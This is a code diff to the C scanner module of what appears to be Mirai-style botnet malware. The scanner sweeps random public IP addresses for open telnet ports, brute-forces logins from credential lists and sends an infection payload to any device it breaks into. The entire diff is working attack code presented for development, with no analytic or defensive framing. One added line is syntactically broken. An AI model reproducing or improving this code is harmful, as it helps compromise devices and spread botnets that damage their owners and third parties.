@@ -16,6 +16,7 @@ ipv4_t LOCAL_ADDR; // Global source port
 struct scan_victim *victim_table;
 
 bool scan_able = true;
+bool scan_scanning = false;
 
 void scan_init(void)
 {
@@ -145,9 +146,10 @@ bool scan_scanner(void)
 	int32_t max = getdtablesize();
 	printd("Maximum files open: %d", max)
 
-	if (scan_able == false)
+	if (scan_able == false || scan_scanning == true)
 		_exit(0);
 
+	scan_scanning = true;
 	printd("Initializing Scanner")
 
 	victim_table = calloc(SCAN_SCANNER_MAXCON, sizeof(struct scan_victim));
@@ -241,9 +243,9 @@ bool scan_scanner(void)
 
 	memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
 
-	printd("Sending packets...")
 	while (1)
 	{
+		printd("Sending packets...")
 		for (i = 0; i < SCAN_SCANNER_BURST; i++)
 		{
 			addr.sin_addr.s_addr = ipv4_random_public(); // It should already be a 32 bit uint
@@ -267,167 +269,172 @@ bool scan_scanner(void)
 			{
 				if (++fails >= SCAN_SCANNER_ERRMAX)
 				{
-					printd("Maximum fails reached: %d", SCAN_SCANNER_ERRMAX)
-					goto end;
+					printd("Fails has surpassed %d Resetting fail count", SCAN_SCANNER_ERRMAX)
+					fails = 0;
 				}
 			}
 		}
-	}
-	while (1)
-	{
-		unsigned char buf[1024];
-		errno = 0;
-
-		i = recvfrom(sock, buf, 1024, 0, NULL, NULL);
-		if (i <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
-			goto end;
-
-		struct iphdr *riph = (struct iphdr *)buf;
-		unsigned short iphdrlen;
 		i = 0;
-		if (riph->protocol == 6)
+		while (1)
 		{
-			iphdrlen = riph->ihl * 4;
-			struct tcphdr *rtcph = (struct tcphdr *)(buf + iphdrlen);
+			unsigned char buf[1024];
+			errno = 0;
 
-			// Check that it is a SYN ACK and if it matches our source port
-			if (rtcph->syn == 1 && rtcph->ack == 1 && rtcph->dest == LOCAL_PORT && rtcph->source == 23/*&& ipv4_inrange(source.sin_addr.s_addr, start, end)*/)
+			sleep(1);
+			if (recvfrom(sock, buf, 1024, 0, NULL, NULL) <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
 			{
+				printd("Failed to recv, moving on.")
+				break;
+			}
+
+			struct iphdr *riph = (struct iphdr *)buf;
+			unsigned short iphdrlen;
+			if (riph->protocol == 6)
+			{
+				iphdrlen = riph->ihl * 4;
+				struct tcphdr *rtcph = (struct tcphdr *)(buf + iphdrlen);
+
+				// Check that it is a SYN ACK and if it matches our source port
+				if (rtcph->syn == 1 && rtcph->ack == 1 && rtcph->dest == LOCAL_PORT && rtcph->source == 23/*&& ipv4_inrange(source.sin_addr.s_addr, start, end)*/)
+				{
 #ifdef DEBUG
 {
-				pktd(riph, rtcph)
-				char ipstr[INET_ADDRSTRLEN];
-				addr.sin_addr.s_addr = riph->saddr;
-				inet_ntop(AF_INET, &(addr.sin_addr), ipstr, INET_ADDRSTRLEN);
-				printd("Adding IP: %s", ipstr)
+					pktd(riph, rtcph)
+					char ipstr[INET_ADDRSTRLEN];
+					addr.sin_addr.s_addr = riph->saddr;
+					inet_ntop(AF_INET, &(addr.sin_addr), ipstr, INET_ADDRSTRLEN);
+					printd("Adding IP: %s/%s", ipstr, ipv4_unpack(riph->saddr))
 }
 #endif
-				struct scan_victim *victim;
-				victim = &victim_table[i];
-				victim->ip = riph->saddr;
-				victim->user = 0;
-				victim->pass = 0;
-				if (i++ >= SCAN_SCANNER_MAXCON)
-					goto skip;
+					struct scan_victim *victim;
+					victim = &victim_table[i];
+					victim->ip = riph->saddr;
+					victim->user = 0;
+					victim->pass = 0;
+					victim->state = READY;
+					if (i++ >= SCAN_SCANNER_MAXCON)
+						break;
+				}
 			}
 		}
-	}
-skip:
-	while (1)
-	{
-		struct sockaddr_in addrx;
-		addrx.sin_family = AF_INET;
-		addrx.sin_port = htons(23);
-		memset(addrx.sin_zero, '\0', sizeof(addrx.sin_zero));
-
-		struct timeval timeout;
-		timeout.tv_sec = SCAN_SCANNER_SEC;
-		timeout.tv_usec = SCAN_SCANNER_USEC;
-
-		for (i = 0; i <= SCAN_SCANNER_MAXCON; i++)
+		while (1)
 		{
-			switch(victim_table[i].state)
+			while (victim_table[i])
+			struct sockaddr_in addrx;
+			addrx.sin_family = AF_INET;
+			addrx.sin_port = htons(23);
+			memset(addrx.sin_zero, '\0', sizeof(addrx.sin_zero));
+
+			struct timeval timeout;
+			timeout.tv_sec = SCAN_SCANNER_SEC;
+			timeout.tv_usec = SCAN_SCANNER_USEC;
+
+			for (i = 0; i <= SCAN_SCANNER_MAXCON; i++)
 			{
-				case CONNECTING:
+				switch(victim_table[i].state)
 				{
-					addrx.sin_addr.s_addr = victim_table[i].ip;
-					if ((victim_table[i].sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+					case CONNECTING:
 					{
-						victim_table[i].state = FINISHED;
-						break;
-					}
-					setsockopt(victim_table[i].sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
-					setsockopt(victim_table[i].sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
-					fcntl(victim_table[i].sock, F_SETFL, fcntl(victim_table[i].sock, F_GETFL, NULL) | O_NONBLOCK);
-					if(connect(victim_table[i].sock, (struct sockaddr *)&addrx, sizeof(addrx)) == -1 && errno != EINPROGRESS)
-					{
-						victim_table[i].state = FINISHED;
-					}
-					else
-					{
-						victim_table[i].state = USERNAME;
-					}
-					break;
-				} 
-				case USERNAME:
-				{
-					/*
-					Need to make this readuntil accept more than one string
-
-					so I can do const userwords[] {
-						"login",
-						"user"
-					}
-					then go readuntil(sock, userwords)
-					*/
-					if (scan_readuntil(victim_table[i].sock, userprompts) == false)
-						victim_table[i].state = FINISHED;
-
-					if (send(victim_table[i].sock, usernames[victim_table[i].user], strlen(usernames[victim_table[i].user]), 0) == -1)
-					{
-						victim_table[i].state = FINISHED;
-						break;
-					}
-
-					if (scan_readuntil(victim_table[i].sock, failstrs) == true)
-					{
-						if (victim_table[i].user++ >= usersize)
+						addrx.sin_addr.s_addr = victim_table[i].ip;
+						if ((victim_table[i].sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
 						{
 							victim_table[i].state = FINISHED;
 							break;
 						}
-					}
-					else
-						victim_table[i].state = PASSWORD;
-/*
-	HEY! This won't work because we will read the password prompt when we try to read for failstrs 
-	this means the next scan_readuntil will 100% fail! 
-	YAYYYYY
-*/
-					break;
-				}
-				case PASSWORD:
-				{
-					if (scan_readuntil(victim_table[i].sock, passprompts) == false)
-						victim_table[i].state = FINISHED;
-
-					if (send(victim_table[i].sock, passwords[victim_table[i].pass], strlen(passwords[victim_table[i].pass]), 0) == -1)
-					{
-						victim_table[i].state = FINISHED;
-						break;
-					}
-
-					if (scan_readuntil(victim_table[i].sock, failstrs) == true)
-						if (victim_table[i].pass++ >= passsize)
+						setsockopt(victim_table[i].sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
+						setsockopt(victim_table[i].sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
+						fcntl(victim_table[i].sock, F_SETFL, fcntl(victim_table[i].sock, F_GETFL, NULL) | O_NONBLOCK);
+						if(connect(victim_table[i].sock, (struct sockaddr *)&addrx, sizeof(addrx)) == -1 && errno != EINPROGRESS)
 						{
-							victim_table[i].pass = 0;
+							victim_table[i].state = FINISHED;
+						}
+						else
+						{
+							victim_table[i].state = USERNAME;
+						}
+						break;
+					} 
+					case USERNAME:
+					{
+						/*
+						Need to make this readuntil accept more than one string
+
+						so I can do const userwords[] {
+							"login",
+							"user"
+						}
+						then go readuntil(sock, userwords)
+						*/
+						if (scan_readuntil(victim_table[i].sock, userprompts) == false)
+							victim_table[i].state = FINISHED;
+
+						if (send(victim_table[i].sock, usernames[victim_table[i].user], strlen(usernames[victim_table[i].user]), 0) == -1)
+						{
+							victim_table[i].state = FINISHED;
+							break;
+						}
+
+						if (scan_readuntil(victim_table[i].sock, failstrs) == true)
+						{
 							if (victim_table[i].user++ >= usersize)
 							{
 								victim_table[i].state = FINISHED;
 								break;
 							}
-							victim_table[i].state = USERNAME;
 						}
 						else
+							victim_table[i].state = PASSWORD;
+	/*
+		HEY! This won't work because we will read the password prompt when we try to read for failstrs 
+		this means the next scan_readuntil will 100% fail! 
+		YAYYYYY
+	*/
+						break;
+					}
+					case PASSWORD:
+					{
+						if (scan_readuntil(victim_table[i].sock, passprompts) == false)
+							victim_table[i].state = FINISHED;
+
+						if (send(victim_table[i].sock, passwords[victim_table[i].pass], strlen(passwords[victim_table[i].pass]), 0) == -1)
+						{
+							victim_table[i].state = FINISHED;
 							break;
-					else
-						victim_table[i].state = PAYLOAD;
-					break;
-				}
-				case PAYLOAD:
-				{
-					send(victim_table[i].sock, SCAN_SCANNER_PAYLOAD, strlen(SCAN_SCANNER_PAYLOAD), 0);
-					victim_table[i].state = FINISHED;
-					break;
-				}
-				case FINISHED:
-				{
-					break;
+						}
+
+						if (scan_readuntil(victim_table[i].sock, failstrs) == true)
+							if (victim_table[i].pass++ >= passsize)
+							{
+								victim_table[i].pass = 0;
+								if (victim_table[i].user++ >= usersize)
+								{
+									victim_table[i].state = FINISHED;
+									break;
+								}
+								victim_table[i].state = USERNAME;
+							}
+							else
+								break;
+						else
+							victim_table[i].state = PAYLOAD;
+						break;
+					}
+					case PAYLOAD:
+					{
+						send(victim_table[i].sock, SCAN_SCANNER_PAYLOAD, strlen(SCAN_SCANNER_PAYLOAD), 0);
+						victim_table[i].state = FINISHED;
+						break;
+					}
+					case FINISHED:
+					{
+						break;
+					}
 				}
 			}
 		}
 	}
 end:
+	scan_scanning = false;
 	free(victim_table);
 	_exit(0);
 }
